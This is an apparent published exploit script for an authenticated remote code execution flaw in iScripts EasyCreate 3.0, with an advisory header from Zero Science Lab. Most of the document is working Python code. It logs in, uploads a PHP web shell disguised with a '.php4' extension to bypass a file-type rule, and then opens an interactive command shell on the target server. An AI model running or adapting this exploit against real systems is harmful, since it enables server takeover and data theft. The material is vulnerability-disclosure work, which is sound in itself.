#
#
# iScripts EasyCreate 3.0 Remote Code Execution Exploit
#
#
# Vendor: iScripts.com
# Product web page: http://www.iscripts.com
# Affected version: 3.0
#
# Summary: iScripts EasyCreate is a private label online website builder. This 
# software allows you to start an online business by offering website building 
# services to your customers. Equipped with drag and drop design functionality, 
# crisp templates and social sharing capabilities, this online website builder 
# software will allow you to provide the best website building features to your 
# users.
#
# Desc: iScripts EasyCreate suffers from an authenticated arbitrary PHP code
# execution. The vulnerability is caused due to the improper verification of 
# uploaded files in &#039;/ajax_image_upload.php&#039; script thru the &#039;userImages&#039; POST 
# parameter. This can be exploited to execute arbitrary PHP code by uploading 
# a malicious PHP script file with &#039;.php4&#039; extension (to bypass the &#039;.htaccess&#039;
# block rule) that will be stored in &#039;/uploads/siteimages/thumb/&#039; directory.
#
# Tested on: Apache
#            MySQL 5.5.40
#
# Vulnerability discovered by Bikramaditya &#039;PhoenixX&#039; Guha
#
# Zero Science Lab - http://www.zeroscience.mk
# Macedonian Information Security Research And Development Laboratory
#
#
# Advisory ID: ZSL-2016-5297
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5297.php
#
#
# 17.11.2015
#
#
 
version = &#039;3.0&#039;
 
import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re
import requests, httplib
 
from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError
 
global file
file = &#039;abcde2&#039;
 
init()
 
if os.name == &#039;posix&#039;: os.system(&#039;clear&#039;)
if os.name == &#039;nt&#039;: os.system(&#039;cls&#039;)
piton = os.path.basename(sys.argv[0])
 
def bannerche():
    print &#039;&#039;&#039;
 @-------------------------------------------------------------@
 |    iScripts EasyCreate 3.0 Remote Code Execution Exploit    |
 |                      ID: ZSL-2016-5297                      |
 |             Copyleft (c) 2016, Zero Science Lab             |
 @-------------------------------------------------------------@
          &#039;&#039;&#039;
    if len(sys.argv) < 1:
        print &#039;\n\x20\x20[*] &#039;+Fore.YELLOW+&#039;Usage: &#039;+Fore.RESET+piton+&#039; <hostname>\n&#039;
        print &#039;\x20\x20[*] &#039;+Fore.CYAN+&#039;Example: &#039;+Fore.RESET+piton+&#039; zeroscience.mk\n&#039;
        sys.exit()
 
bannerche()
 
print &#039;\n\x20\x20[*] Initialising exploit &#039;+&#039;.&#039;*34+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
host = sys.argv[1]
 
cj = cookielib.CookieJar()
opener2 = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 
print &#039;\x20\x20[*] Checking host and path &#039;+&#039;.&#039;*32+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
opener2.open(&#039;http://&#039;+host+&#039;/easycreate/demo/login.php&#039;)
 
print &#039;\x20\x20[*] Login please.&#039;
 
username = raw_input(&#039;\x20\x20[*] Enter username: &#039;)
password = raw_input(&#039;\x20\x20[*] Enter password: &#039;)
 
login_data = urllib.urlencode({
                            &#039;vuser_login&#039; : username,
                            &#039;vuser_password&#039; : password,                            
                            })
 
login = opener2.open(&#039;http://&#039;+host+&#039;/easycreate/demo/login.php?act=post&#039;, login_data)
auth = login.read()
 
if re.search(r&#039;Invalid username and&#039;, auth):
    print &#039;\x20\x20[*] Incorrect username or password &#039;+&#039;.&#039;*24+Fore.RED+&#039;[ER]&#039;+Fore.RESET
    print
    sys.exit()
else:
    print &#039;\x20\x20[*] Authenticated &#039;+&#039;.&#039;*41+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
     
response = opener2.open(&#039;http://&#039;+host+&#039;/easycreate/demo/usermain.php?succ=msg&#039;)
output = response.read()
 
for session in cj:
    sessid = session.name
 
print &#039;\x20\x20[*] Mapping session ID &#039;+&#039;.&#039;*36+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
ses_chk = re.search(r&#039;%s=\w+&#039; % sessid , str(cj))
cookie = ses_chk.group(0)
print &#039;\x20\x20[*] Cookie: &#039;+Fore.YELLOW+cookie+Fore.RESET
 
class MultiPartForm(object):
 
    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
     
    def get_content_type(self):
        return &#039;multipart/form-data; boundary=%s&#039; % self.boundary
 
    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return
 
    def add_file(self, field_name, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or &#039;application/octet-stream&#039;
        self.files.append((field_name, filename, mimetype, body))
        return
     
    def __str__(self):
 
        parts = []
        part_boundary = &#039;--&#039; + self.boundary
         
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: form-data; name="%s"; filename="%s"&#039; % \
                 (field_name, filename),
              &#039;Content-Type: application/x-msdownload&#039;,
              &#039;&#039;,
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
             
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: form-data; name="%s"&#039; % name,
              &#039;&#039;,
              value,
            ]
            for name, value in self.form_fields
            )
         
        flattened = list(itertools.chain(*parts))
        flattened.append(&#039;--&#039; + self.boundary + &#039;--&#039;)
        flattened.append(&#039;&#039;)
        return &#039;\r\n&#039;.join(flattened)
 
if __name__ == &#039;__main__&#039;:
     
    form = MultiPartForm()
    form.add_file(&#039;userImages&#039;, &#039;abcde2.php4&#039;, 
                  fileHandle=StringIO(&#039;<?php system(\$_GET[\\\&#039;cmd\\\&#039;]); ?>&#039;))
 
 
    request = urllib2.Request(&#039;http://&#039;+host+&#039;/easycreate/demo/ajax_image_upload.php&#039;)
    request.add_header(&#039;User-agent&#039;, &#039;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0&#039;)
    request.add_header(&#039;Referer&#039;, &#039;http://&#039;+host+&#039;/easycreate/demo/gallerymanager.php&#039;)
    request.add_header(&#039;Accept-Language&#039;, &#039;en-US,en;q=0.5&#039;)
    body = str(form)
    request.add_header(&#039;Content-type&#039;, form.get_content_type())
    request.add_header(&#039;Connection&#039;, &#039;keep-alive&#039;)
    request.add_header(&#039;Accept&#039;, &#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;)
    request.add_header(&#039;Accept-Encoding&#039;, &#039;gzip, deflate&#039;)
    request.add_header(&#039;Cookie&#039;, cookie)
    request.add_header(&#039;Content-length&#039;, len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()
    print &#039;\x20\x20[*] Sending payload &#039;+&#039;.&#039;*39+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
response = opener2.open(&#039;http://&#039;+host+&#039;/easycreate/demo/gallerymanager.php&#039;)
output = response.read()
 
for line in output.splitlines():
    if file in line:
            filename = str(line.split("=")[2:])[3:84]
            print filename
 
print Style.DIM+Fore.CYAN+&#039;\x20\x20[*] Press [ ENTER ] to INSERT COIN!\n&#039;+Style.RESET_ALL+Fore.RESET
raw_input()
while True:
    try:
        cmd = raw_input(Fore.RED+&#039;shell@&#039;+host+&#039;:~# &#039;+Fore.RESET)
        execute = opener2.open(filename+&#039;cmd=&#039;+cmd)
        reverse = execute.read()
        print reverse
         
        if cmd.strip() == &#039;exit&#039;:
            break
 
    except Exception:
        break
 
sys.exit()

